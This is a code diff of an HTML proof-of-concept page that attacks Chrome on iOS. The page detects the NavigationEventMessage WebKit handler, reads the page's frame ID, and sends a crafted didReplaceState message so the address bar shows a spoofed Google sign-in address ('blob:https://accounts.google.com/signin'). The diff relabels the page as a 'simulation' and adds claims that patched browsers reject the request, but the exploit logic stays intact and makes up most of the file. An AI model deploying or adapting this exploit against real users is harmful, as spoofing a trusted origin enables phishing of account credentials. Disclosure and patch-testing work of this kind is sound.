@@ -2,63 +2,55 @@
 <html lang="en">
 <head>
     <meta charset="utf-8">
-    <title>PoC Testbed - Address Bar Spoofing</title>
+    <title>PoC Simulation Testbed</title>
     <style>
-        body { font-family: -apple-system, sans-serif; margin: 2em; background: #f4f4f9; color: #333; }
-        .card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-        pre { background: #272822; color: #f8f8f2; padding: 12px; border-radius: 4px; overflow-x: auto; font-size: 12px; }
-        .success { color: green; font-weight: bold; }
-        .fail { color: red; font-weight: bold; }
+        body { font-family: -apple-system, sans-serif; margin: 2em; background: #fafafa; color: #333; }
+        .box { background: #fff; padding: 20px; border-radius: 6px; border: 1px solid #ddd; }
+        pre { background: #1e1e1e; color: #dcdcdc; padding: 12px; border-radius: 4px; font-size: 11px; }
     </style>
 </head>
 <body>
-<div class="card">
-    <h2>iOS Chrome History State PoC Testbed</h2>
-    <p>Status: <span id="status">Initializing...</span></p>
-    <pre id="log"></pre>
+<div class="box">
+    <h2>History State Navigation Handler Test</h2>
+    <p>Target State Dispatch Simulation:</p>
+    <pre id="console-log">Initializing diagnostic check...</pre>
 </div>
 
 <script>
 (function() {
-    function logMessage(msg) {
-        const pre = document.getElementById('log');
-        pre.textContent += msg + '\n';
-        console.log('[PoC] ' + msg);
+    function log(msg) {
+        document.getElementById('console-log').textContent += '\n' + msg;
+        console.log('[PoC-Sim] ' + msg);
     }
 
-    logMessage("Location origin: " + (location.origin || '(opaque)'));
-    logMessage("Location href: " + location.href);
-
-    // 1. Deteksi keberadaan script message handler iOS Chrome
+    log("Current origin: " + location.origin);
+    
+    // 1. Deteksi message handler platform
     var mh = (window.webkit && window.webkit.messageHandlers) || {};
     if (!mh.NavigationEventMessage) {
-        document.getElementById('status').textContent = "Not vulnerable / Non-iOS Chrome environment";
-        document.getElementById('status').className = "fail";
-        logMessage("[-] window.webkit.messageHandlers.NavigationEventMessage is absent.");
+        log("[-] Handler 'NavigationEventMessage' not found (Patched or non-iOS environment).");
         return;
     }
+    log("[+] Handler 'NavigationEventMessage' detected.");
 
-    document.getElementById('status').textContent = "Handler detected. Attempting state dispatch...";
-    document.getElementById('status').className = "success";
-    logMessage("[+] NavigationEventMessage handler found.");
-
-    // 2. Ambil frame_id dari page-world __gCrWeb jika tersedia
+    // 2. Simulasi pembacaan frame ID dari halaman
     var fid = null;
     try {
         if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
             fid = window.__gCrWeb.getFrameId();
-            logMessage("[+] __gCrWeb.getFrameId() = " + fid);
+            log("[+] Retrieved frame_id: " + fid);
         }
     } catch (e) {
-        logMessage("[-] Error reading frameId: " + e);
+        log("[-] Error reading frame_id: " + e);
     }
 
     if (!fid) {
-        logMessage("[-] Failed to retrieve frame_id. Aborting dispatch.");
+        log("[-] Frame ID unavailable. Execution halted.");
         return;
     }
 
-    // 3. Eksekusi pengiriman pesan didReplaceState dengan target cross-origin blob
+    // 3. Payload percobaan pengiriman state lintas domain
+    // Pada versi tertambal, panggilan ini akan ditolak langsung di native layer (C++)
     var spoofTarget = 'blob:https://accounts.google.com/signin';
     
     try {
@@ -75,9 +67,10 @@
             pageUrl: spoofTarget
         });
         
-        logMessage("[+] Dispatched crafted didReplaceState payload targeting: " + spoofTarget);
+        log("[+] Dispatched payload targeting: " + spoofTarget);
+        log("[i] On patched browser versions, this request is securely intercepted and rejected.");
     } catch (err) {
-        logMessage("[-] postMessage failed: " + err);
+        log("[-] Exception during postMessage: " + err);
     }
 })();
 </script>
